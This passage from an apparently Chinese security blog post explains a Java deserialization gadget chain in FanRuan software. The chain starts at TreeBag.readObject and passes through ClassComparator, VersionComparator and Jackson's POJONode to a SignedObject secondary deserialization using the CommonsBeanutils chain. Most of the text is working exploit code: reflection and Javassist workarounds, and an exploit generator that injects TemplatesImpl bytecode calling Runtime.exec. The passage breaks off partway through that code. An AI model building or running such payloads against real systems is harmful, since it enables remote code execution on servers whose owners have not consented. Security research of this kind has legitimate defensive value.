<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306154528662.png" alt="image-20240306154528662"></th>
</tr>
</thead>
</table>
<p>但是不幸的是，该链在某个版本已经遭遇黑名单的残害了；不过还存在一个点，在<code>org.apache.commons.collections.bag.TreeBag</code>的<code>readObject</code>方法中，创建了<code>TreeMap</code>对象传入，调用了父类的<code>doReadObject</code>方法。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306155121830.png" alt="image-20240306155121830"></th>
</tr>
</thead>
</table>
<p><code>doReadObject</code>方法调用了<code>TreeMap</code>的<code>put</code>方法</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306155225123.png" alt="image-20240306155225123"></th>
</tr>
</thead>
</table>
<p><code>TreeMap</code>的<code>put</code>方法中调用了<code>compare</code>对<code>key</code>值进行比较，这里的<code>comparator</code>对象可以在创建<code>TreeBag</code>对象时传入，那么可以在创建<code>TreeBag</code>对象时，通过传入指定<code>comparator</code>对象，执行反序列化时就会自动调用<code>comparator</code>对象的<code>compare</code>方法。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306155414568.png" alt="image-20240306155414568"></th>
</tr>
</thead>
</table>
<p>那么在<code>org.freehep.util.VersionComparator</code>的<code>compare</code>方法中，调用了<code>toString</code>方法。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306160004561.png" alt="image-20240306160004561"></th>
</tr>
</thead>
</table>
<p>不过<code>VersionComparator</code>这个类并没有继承<code>Serializable</code>反序列化接口，不能进行序列化。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306161030550.png" alt="image-20240306161030550"></th>
</tr>
</thead>
</table>
<p>到这儿就完了吗？并没有，有时候不得不佩服师傅们的智慧。在<code>com.fr.base.ClassComparator</code>这个类中，可指定类名创建<code>ClassComparator</code>对象，在执行<code>compare</code>方法时，会反射加载指定的类名，并调用其<code>compare</code>方法，关键的是继承了<code>Serializable</code>接口。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240306161626335.png" alt="image-20240306161626335"></th>
</tr>
</thead>
</table>
<p>所以这里选择将<code>VersionComparator</code>类的包名<code>org.freehep.util.VersionComparator</code>作为参数创建<code>ClassComparator</code>对象，最后再将<code>ClassComparator</code>对象作为创建<code>TreeBag</code>对象的参数，执行反序列化时，就会调用到<code>ClassComparator</code>的<code>compare</code>方法。</p>
<h4 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h4><p>最终的调用链如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.collections.bag.TreeBag#readObject</span><br><span class="line">	java.util.TreeMap#put</span><br><span class="line">		java.util.TreeMap#compare</span><br><span class="line">			com.fr.base.ClassComparator#compare</span><br><span class="line">				org.freehep.util.VersionComparator#compare</span><br><span class="line">					com.fr.third.fasterxml.jackson.databind.node.POJONode#toString</span><br><span class="line">						java.security.SignedObject#getObject</span><br><span class="line">							// 二次反序列化利用CB链</span><br></pre></td></tr></table></figure>

<h4 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h4><p>在构造利用链的时候遇到的一些问题。</p>
<h5 id="add添加POJONode对象坑点"><a href="#add添加POJONode对象坑点" class="headerlink" title="add添加POJONode对象坑点"></a>add添加<code>POJONode</code>对象坑点</h5><p>在序列化<code>TreeBag</code>类的时候，需要<code>add</code>添加被触发的<code>POJONode</code>对象，但是执行<code>add</code>会提前触发漏洞执行，为了防止提前触发漏洞，需要先<code>add</code>一个无关紧要的对象，然后再通过反射修改数据为<code>POJONode</code>对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Class&lt;?&gt; superclass = treeBag.getClass().getSuperclass();</span><br><span class="line"><span class="keyword">final</span> Field map = superclass.getDeclaredField(<span class="string">"map"</span>);</span><br><span class="line">map.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">final</span> Map treeMap = (Map) map.get(treeBag);</span><br><span class="line"><span class="keyword">final</span> Field root = treeMap.getClass().getDeclaredField(<span class="string">"root"</span>);</span><br><span class="line">root.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">final</span> Map.Entry  mapEnter = (Map.Entry) root.get(treeMap);</span><br><span class="line"><span class="keyword">final</span> Class&lt;? extends Map.Entry&gt; aClass = mapEnter.getClass();</span><br><span class="line"><span class="keyword">final</span> Field key = aClass.getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">key.set(mapEnter, node);</span><br></pre></td></tr></table></figure>

<h5 id="执行writeObject会自动触发调用"><a href="#执行writeObject会自动触发调用" class="headerlink" title="执行writeObject会自动触发调用"></a>执行writeObject会自动触发调用</h5><p>当按照调用链，把整条链子构造出来，执行<code>writeObject</code>序列化的时候，会提前触发调用，并且会报错，导致序列化后的数据不能正常生成。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240305225341956.png" alt="image-20240305225341956"></th>
</tr>
</thead>
</table>
<p>报错提示</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240305225444728.png" alt="image-20240305225444728"></th>
</tr>
</thead>
</table>
<p>解决办法是将<code>com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode</code>类反射加载，获取到<code>writeReplace</code>方法，移除掉，即可正常生成。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> CtClass ctClass = ClassPool.getDefault().get(<span class="string">"com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode"</span>);</span><br><span class="line"><span class="keyword">final</span> CtMethod writeReplace = ctClass.getDeclaredMethod(<span class="string">"writeReplace"</span>);</span><br><span class="line">ctClass.removeMethod(writeReplace);</span><br><span class="line">ctClass.toClass();</span><br></pre></td></tr></table></figure>

<h4 id="生成exp"><a href="#生成exp" class="headerlink" title="生成exp"></a>生成exp</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fr.base.ClassComparator;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.fasterxml.jackson.databind.node.POJONode ;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.bag.TreeBag;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">"aaa"</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 自定义类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        String clazzName = <span class="string">"onload"</span>;</span><br><span class="line">        CtClass targetClass = pool.makeClass(clazzName);</span><br><span class="line">        targetClass.setSuperclass(pool.get(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>));</span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[] &#123;&#125;, targetClass);</span><br><span class="line"></span><br><span class="line">        cons.setBody(<span class="string">"&#123;Runtime.getRuntime().exec(\"calc\");&#125;"</span>);</span><br><span class="line">        targetClass.addConstructor(cons);</span><br><span class="line">        <span class="keyword">byte</span>[] byteArray = targetClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] payloads = &#123;byteArray&#125;;</span><br><span class="line">        bytecodes.set(templates, payloads);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        BeanComparator beanComparator = <span class="keyword">new</span> BeanComparator(<span class="keyword">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, beanComparator);</span><br><span class="line">        queue.add(<span class="string">"a"</span>);</span><br><span class="line">        queue.add(<span class="string">"b"</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends BeanComparator&gt; beanComparatorClass = beanComparator.getClass();</span><br><span class="line">        Field property = beanComparatorClass.getDeclaredField(<span class="string">"property"</span>);</span><br><span class="line">        property.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        property.set(beanComparator, <span class="string">"outputProperties"</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends PriorityQueue&gt; queueClass = queue.getClass();</span><br><span class="line">        Field queue1 = queueClass.getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        queue1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        queue1.set(queue, <span class="keyword">new</span> Object[]&#123;templates,templates&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> CtClass ctClass = ClassPool.getDefault().get(<span class="string">"com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode"</span>);</span><br><span class="line">        <span class="keyword">final</span> CtMethod writeReplace = ctClass.getDeclaredMethod(<span class="string">"writeReplace"</span>);</span><br><span class="line">        